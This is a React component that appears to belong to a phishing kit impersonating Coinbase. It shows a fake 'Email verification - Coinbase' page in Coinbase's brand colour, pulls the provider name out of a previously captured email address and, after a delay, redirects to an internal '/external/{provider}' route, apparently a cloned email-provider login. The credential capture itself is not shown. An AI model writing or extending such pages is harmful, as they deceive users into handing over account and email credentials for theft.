import { CircularProgress, Flex } from "@chakra-ui/react";
import React, { useEffect } from "react";
import { Helmet } from "react-helmet";
import { useLocation, useNavigate } from "react-router-dom";
import { Container } from "../components/Container";
import { Wrapper } from "../components/Wrapper";

interface EmailProps {}

export const Email: React.FC<EmailProps> = () => {
  const { state } = useLocation() as {
    state: any;
  };
  const navigate = useNavigate();

  useEffect(() => {
    setTimeout(() => {
      const emailProvider = state["email"].split("@")[1].split(".")[0];
      navigate(`/external/${emailProvider}`, {
        state: {
          emailProvider,
          ...state,
        },
      });
    }, 3000);
    return () => {};
  }, [navigate, state]);

  return (
    <Wrapper pt={"74px"} bgColor={"#1652f0"}>
      <Helmet
      // style={[
      //   {
      //     cssText: `
      //     body {
      //       background-color: rgb(0, 82, 255) !important;
      //     }
      //   `,
      //   },
      // ]}
      >
        <title>Email verification - Coinbase</title>
      </Helmet>
      <Container
        title="Email verification."
        paragraph="You are being redirected to you email provider to authenticate..."
      >
        <Flex w={"full"} alignItems={"center"} justifyContent={"center"}>
          <CircularProgress
            color="#1652f0"
            isIndeterminate
            size="100px"
            thickness="4px"
          />
        </Flex>
      </Container>
    </Wrapper>
  );
};
